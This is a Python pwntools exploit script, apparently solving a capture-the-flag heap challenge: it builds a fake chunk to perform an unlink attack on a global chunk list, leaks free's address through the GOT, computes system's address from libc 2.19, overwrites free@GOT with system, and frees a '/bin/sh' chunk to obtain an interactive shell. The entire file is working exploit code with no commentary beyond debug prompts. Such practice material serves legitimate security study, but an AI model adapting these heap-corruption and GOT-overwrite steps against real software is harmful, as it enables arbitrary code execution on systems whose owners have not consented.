#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author: 0x4C43

from pwn import *

#context.log_level = 'debug'
#p = remote('127.0.0.1',6666)
p = process('./heap')

libc = ELF("libc-2.19.so")
pwn_elf = ELF("heap")

chunk_list = 0x8049d60

def add_chunk(len):
    p.sendline('1')
    print p.recvuntil('Input the size of chunk you want to add:')
    p.sendline(str(len))

def set_chunk(index,data):
    p.recvuntil('5.Exit\n')
    p.sendline('2')
    p.recvuntil('Set chunk index:')
    p.sendline(str(index))
    p.recvuntil('Set chunk data:')
    p.sendline(data)

def set_chunk2(index, data):
    p.sendline('2')
    p.recvuntil('Set chunk index:')
    p.sendline(str(index))
    p.recvuntil('Set chunk data:')
    p.sendline(data)

def del_chunk(index):
    p.recvuntil('\n')
    p.sendline('3')
    p.recvuntil('Delete chunk index:')
    p.sendline(str(index))

def print_chunk(index):
    p.recvuntil('5.Exit\n')
    p.sendline('4')
    p.recvuntil('Print chunk index:')
    p.sendline(str(index))
    res = p.recvuntil('5.Exit\n')
    return res

print "\n-------------------------add chunk---------------------------"
raw_input('# add_chunk')
add_chunk(128)  #0
add_chunk(128)  #1
add_chunk(128)  #2
add_chunk(128)  #3

raw_input('# set_chunk3')
set_chunk(3, '/bin/sh')

print "\n-------------------fake a chunk and unlink-------------------"
payload = ""
payload += p32(0) + p32(0x81) + p32(chunk_list-0xc) + p32(chunk_list-0x8)
payload += "A"*(0x80-4*4) 
payload += p32(0x80) + p32(0x88)  #2nd chunk

raw_input('# fake chunk0')
set_chunk(0,payload)

raw_input('# free chunk1')  #control the pointer
del_chunk(1)

print "\n--------------------leak system address----------------------"
raw_input('# leak')
free_got = pwn_elf.got['free']
set_chunk(0, 'A' * 12 + p32(free_got))
ret = print_chunk(0)
free_add = u32(ret[0:4])
system_add = free_add - libc.symbols['free'] + libc.symbols['system']
print("system addr: %#x" % system_add)

print "\n-------------------exec system('/bin/sh')--------------------"
raw_input('# write system_add to free@got')
data = p32(system_add)
set_chunk2('0', data)

raw_input('# free chunk3')
del_chunk('3')
p.interactive()
p.close()
